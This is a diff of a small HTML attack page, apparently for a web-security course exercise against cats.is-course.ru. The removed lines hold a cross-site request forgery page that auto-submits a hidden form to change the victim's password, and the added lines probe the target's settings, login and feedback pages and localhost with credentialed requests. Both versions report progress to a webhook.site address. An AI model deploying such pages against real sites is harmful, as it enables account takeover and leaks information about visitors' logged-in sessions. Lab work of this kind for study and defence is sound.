@@ -1,12 +1,15 @@
-<!doctype html><html><head><meta charset="utf-8"></head><body>
-<h1>kittens</h1>
-<form id="f" method="POST" action="https://cats.is-course.ru/settings">
-<input type="text" name="password" value="Top9!navmeow2026">
-<input type="text" name="confirm-password" value="Top9!navmeow2026">
-<input type="submit" value="go"></form>
+<!doctype html><html><head><meta charset="utf-8"></head><body><h1>cat pics</h1>
 <script>
 var U="5169748c-49df-4307-9820-7383309d9f02";
-(new Image()).src="https://webhook.site/"+U+"/nav_start";
-setTimeout(function(){ document.getElementById('f').submit();
-  setTimeout(function(){(new Image()).src="https://webhook.site/"+U+"/nav_survived";},500); },300);
+function beep(n){(new Image()).src="https://webhook.site/"+U+"/"+n;}
+function probe(url,tag){
+  fetch(url,{mode:"no-cors",credentials:"include",redirect:"manual"})
+   .then(function(r){beep(tag+"_"+r.type);})
+   .catch(function(e){beep(tag+"_ERR");});
+}
+probe("https://cats.is-course.ru/settings","catsettings");
+probe("https://cats.is-course.ru/login","catslogin");
+probe("https://cats.is-course.ru/feedback","catsfeedback");
+probe("http://localhost:8080/settings","locsettings");
+setTimeout(function(){beep("done");},2500);
 </script></body></html>
